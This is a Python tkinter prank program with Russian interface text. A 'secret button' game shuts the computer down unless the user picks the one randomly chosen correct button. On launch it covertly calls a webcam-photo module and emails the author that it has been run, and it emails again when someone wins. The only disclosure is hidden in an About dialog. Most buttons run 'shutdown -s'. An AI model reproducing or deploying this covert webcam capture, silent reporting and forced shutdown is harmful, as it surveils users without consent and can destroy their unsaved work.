import os
import random
from tkinter import *
from send_message import Message
from tkinter.messagebox import showinfo
from WebPhoto import MakePhoto


try:
	MakePhoto.Photo()
except:
	try:
		Message.send_email('Не удалось сделать фото', 'Не удалось сделать фото')
	except:
		print('(Или неизвестная ошибка в создании фото)')

try:
	Message.send_email('Пользователь запустил проект', 'Запущен проект!')
except:
	print('Нет сети, чтобы отправить создателю оповещение о запуске квеста!!!(Или неизвестная ошибка)')

def exit():
	try:
		os.system('shutdown -s')
	except:
		print('Error!')
	print('power off')

def Win():
	print('Congratulations!\nYou win!\a\a\a')
	root = Tk()
	lab = Label(root, text='''
		\nПоздравляю! \nВы победили!\nСоздателю приложения будет отправлено оповещение о прохождении теста"
		''',font = 'Arial 18', height=20, background='black', foreground='white')
	try:
		Message.send_email('Project Prank', 'Пользователю удалось пройти данный квест!\nНеобходимо продолжить разработку!')
	except:
		print('Нет сети, чтобы отправить создателю оповещение о прохождении квеста!!!(Или неизвестная ошибка)')
	lab.pack()
	root.mainloop()

def cancel(event):
	os.system('shutdown -a')

def about():
	showinfo('Информация', "Автор программы Храбрых Максим\nСайт - https://vk.com/world_of_believe\nМне придет сообщение на email о том, что вы запустили программу")

root = Tk()
#root.geometry('450x250')
root['background'] = 'white'
root.title('Секретная кнопка')
# root.iconbitmap(r'C:\Users\Maxim\Desktop\Alex-T-Fresh-Fruit-Apple.ico')
root.resizable(False, False)


m = Menu(root)
root.config(menu=m)
fm = Menu(m)
m.add_command(label="Информация", command=about)
m.add_command(label="Выход", command=exit)

lab = Label(root, text='''
		\n\n\tВам необходимо выбрать верную кнопку,\t\n   иначе компьютер будет выключен.\t\n\n
		''', font = 'Arial 16', width='42')

pushButton = Button(root, bg='silver', width = 23, height = 3)
pushButton_2 = Button(root, bg='silver', width = 23, height = 3)
pushButton_3 = Button(root, bg='silver', width = 23, height = 3)
pushButton_4 = Button(root, bg='silver', width = 23, height = 3)
pushButton_5 = Button(root, bg='silver', width = 23, height = 3)
pushButton_6 = Button(root, bg='silver', width = 23, height = 3)
pushButton_7 = Button(root, bg='silver', width = 23, height = 3)
pushButton_8 = Button(root, bg='silver', width = 23, height = 3)
pushButton_9 = Button(root, bg='silver', width = 23, height = 3)

array = [pushButton, pushButton_2, pushButton_3, pushButton_4, pushButton_5, pushButton_6, pushButton_7,
pushButton_8, pushButton_9]

lab.grid(row=0, column=0, columnspan=3)
pushButton.grid(row=1, column=0)
pushButton_2.grid(row=1, column=1)
pushButton_3.grid(row=1, column=2)
pushButton_4.grid(row=2, column=0)
pushButton_5.grid(row=2, column=1)
pushButton_6.grid(row=2, column=2)
pushButton_7.grid(row=3, column=0)
pushButton_8.grid(row=3, column=1)
pushButton_9.grid(row=3, column=2)
n=0
for i in array:
    i['text'] = 'Нажми меня'
    i['command'] = exit

SecretButton = random.choice(array)
SecretButton['command'] = Win

root.bind('<Delete>', cancel)

root.mainloop()